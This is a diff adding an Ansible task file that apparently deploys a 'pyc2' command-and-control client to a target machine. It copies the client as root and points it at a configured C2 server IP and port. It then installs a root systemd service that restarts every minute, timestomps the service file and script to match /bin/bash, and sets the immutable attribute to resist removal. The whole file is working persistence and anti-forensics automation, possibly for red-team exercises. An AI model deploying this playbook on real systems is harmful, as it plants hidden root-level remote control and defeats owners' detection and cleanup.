@@ -1,0 +1,57 @@
+---
+- name: Copy shell script to target system
+  copy:
+    src: "files/client.py"
+    dest: "{{ pyc2_client_location_unix }}"
+    owner: root
+    group: root
+    mode: '0755'
+
+# Need to do this as separate tasks
+- name: Update server IP
+  replace:
+    path: "{{ pyc2_client_location_unix }}"
+    regexp: '^SERVER=.*'
+    replace: 'SERVER="{{ pyc2_server }}"'
+
+- name: Update server port
+  replace:
+    path: "{{ pyc2_client_location_unix }}"
+    regexp: '^SERVER_PORT=.*'
+    replace: 'SERVER_PORT="{{ pyc2_port }}"'
+
+- name: Create systemd service to execute script
+  copy:
+    dest: "/etc/systemd/system/{{ pyc2_service_name }}.service"
+    content: |
+      [Unit]
+      Description={{ pyc2_service_description }}
+      After=network.target
+
+      [Service]
+      ExecStart=/usr/bin/python3 {{ pyc2_client_location_unix }}
+      Restart=always
+      RestartSec=60
+      User=root
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Reload systemd to recognize new service
+  systemd:
+    daemon_reload: yes
+
+- name: Enable and start the new service
+  systemd:
+    name: "{{ pyc2_service_name }}"
+    enabled: yes
+    state: started
+
+- name: Timestomp the systemd service file
+  command: touch -r /bin/bash /etc/systemd/system/{{ pyc2_service_name }}.service
+
+- name: Timestomp script to match /bin/bash creation time
+  command: touch -r /bin/bash {{ pyc2_client_location_unix }}
+
+- name: Set immutable attribute on script
+  command: "chattr +i {{ pyc2_client_location_unix }}"
